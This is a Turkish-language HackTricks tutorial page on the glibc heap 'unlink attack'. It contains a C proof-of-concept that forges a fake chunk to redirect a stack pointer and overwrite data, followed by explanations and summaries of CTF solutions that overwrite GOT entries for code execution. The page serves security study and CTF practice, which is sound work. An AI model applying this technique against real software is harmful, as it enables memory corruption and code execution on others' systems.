# Unlink Attack

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **Bize katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi** **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

## Temel Bilgiler

Bu saldırı keşfedildiğinde, çoğunlukla bir WWW (Write What Where) sağlamaktaydı, ancak bazı **kontroller eklendi** ve bu da saldırının yeni versiyonunu daha ilginç, daha karmaşık ve **işe yaramaz** hale getirdi.

### Kod Örneği:

<details>

<summary>Kod</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

* Saldırı, tcaches kullanıldığında çalışmaz (2.26'dan sonra)

### Hedef

Bu saldırı, **bir parçanın işaretçisini kendisinden 3 adres önceki bir adrese işaret edecek şekilde değiştirmeye** olanak tanır. Eğer bu yeni konum (işaretçinin bulunduğu yerin çevresi) diğer kontrol edilebilir tahsisler / yığın gibi ilginç şeyler içeriyorsa, bunları okumak/yazmak mümkün olabilir ve daha büyük bir zarar vermek için kullanılabilir.

* Eğer bu işaretçi yığında bulunuyorsa, çünkü artık kendisinden 3 adres önceye işaret ediyor ve kullanıcı bunu okuyup değiştirebiliyorsa, yığından hassas bilgileri sızdırmak veya hatta dönüş adresini (belki) canary'ye dokunmadan değiştirmek mümkün olacaktır.
* CTF örneklerinde, bu işaretçi diğer tahsislere işaret eden bir işaretçi dizisinde yer almaktadır, bu nedenle, 3 adres önceye işaret edecek şekilde ayarlandığında ve okunup yazılabildiğinde, diğer işaretçilerin başka adreslere işaret etmesi sağlanabilir.\
Kullanıcı diğer tahsisleri de okuyup/yazabildiğinden, bilgi sızdırabilir veya yeni adresleri rastgele konumlarda (GOT gibi) yazabilir.

### Gereksinimler

* Bazı özelliklere değerler vererek birkaç parça oluşturmak için bir bellek üzerinde (örneğin yığın) kontrol.
* Sahte parçanın işaretçilerini ayarlamak için yığın sızıntısı.

### Saldırı

* İki parça vardır (chunk1 ve chunk2)
* Saldırgan chunk1'in içeriğini ve chunk2'nin başlıklarını kontrol eder.
* Chunk1'de saldırgan sahte bir parçanın yapısını oluşturur:
* Koruma önlemlerini aşmak için `size` alanının doğru olduğundan emin olur, böylece `corrupted size vs. prev_size while consolidating` hatasından kaçınır.
* ve sahte parçanın `fd` ve `bk` alanları, chunk1 işaretçisinin saklandığı yere -3 ve -2 ofsetleri ile işaret ediyor, böylece `fake_chunk->fd->bk` ve `fake_chunk->bk->fd` gerçek chunk1 adresinin bulunduğu bellek (yığın) konumuna işaret eder:

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

* Chunk2'nin başlıkları, önceki parçanın kullanılmadığını ve boyutun içerdiği sahte parçanın boyutu olduğunu gösterecek şekilde değiştirilir.
* İkinci parça serbest bırakıldığında, bu sahte parça bağlantısı kesilir:
* `fake_chunk->fd->bk` = `fake_chunk->bk`
* `fake_chunk->bk->fd` = `fake_chunk->fd`
* Daha önce `fake_chunk->fd->bk` ve `fake_chunk->bk->fd` aynı yere (chunk1'in saklandığı yığın konumu) işaret edecek şekilde ayarlanmıştı, bu nedenle geçerli bir bağlı listeydi. **Her ikisi de aynı konuma işaret ettiğinden**, yalnızca sonuncusu (`fake_chunk->bk->fd = fake_chunk->fd`) **etki** gösterecektir.
* Bu, **yığındaki chunk1 işaretçisini yığında 3 adres önce saklanan adrese (veya byte'lara) yazacak şekilde** **aşındıracaktır**.
* Bu nedenle, bir saldırgan chunk1'in içeriğini tekrar kontrol edebilirse, **yığın içinde yazma** yeteneğine sahip olacak ve potansiyel olarak dönüş adresini atlayarak canary'yi geçip yerel değişkenlerin değerlerini ve işaretlerini değiştirebilecektir. Hatta yığında saklanan chunk1 adresini, saldırgan tekrar chunk1'in içeriğini kontrol edebilirse, farklı bir konuma yazacak şekilde değiştirebilir.
* Bunun mümkün olduğunu unutmayın çünkü **adresler yığında saklanmaktadır**. Risk ve istismar, **sahte parçaya ait adreslerin nerede saklandığına** bağlı olabilir.

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## Referanslar

* [https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit)
* CTF'de bir unlink saldırısı bulmak garip olsa da, bu saldırının kullanıldığı bazı yazılımlar burada:
* CTF örneği: [https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html](https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html)
* Bu örnekte, yığın yerine malloc edilmiş adreslerin bir dizisi vardır. Burada bir parça tahsis edebilmek için unlink saldırısı gerçekleştirilir, böylece malloc edilmiş adresler dizisinin işaretçilerini kontrol edebilmek mümkündür. Ardından, bu adreslerdeki parçaların içeriğini değiştirmeye olanak tanıyan başka bir işlev vardır, bu da adresleri GOT'a işaret etmeyi, işlev adreslerini sızdırmak ve RCE için değiştirmeyi sağlar.
* Başka bir CTF örneği: [https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html](https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html)
* Önceki örnekte olduğu gibi, tahsislerin adreslerinin bir dizisi vardır. İlk tahsise işaret eden adresi dizinin başlangıcından birkaç konum önceye işaret edecek şekilde bir unlink saldırısı gerçekleştirmek mümkündür ve bu tahsisi yeni konumda aşındırmak mümkündür. Bu nedenle, diğer tahsislerin işaretçilerini atoi'nin GOT'una işaret edecek şekilde aşındırmak, libc sızıntısını elde etmek için yazdırmak ve ardından atoi GOT'u bir gadget adresi ile aşındırmak mümkündür.
* Unlink saldırısına çok benzer bir açığı istismar eden özel malloc ve free işlevleri ile CTF örneği: [https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html)
* FD ve BK işaretçilerini kontrol etmeye olanak tanıyan bir taşma vardır. Ayrıca, yığın exec bitine sahiptir, bu nedenle bir yığın adresini sızdırmak ve GOT'dan bir işlevi bir shellcode ile yığın parçasına işaret etmek mümkündür.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
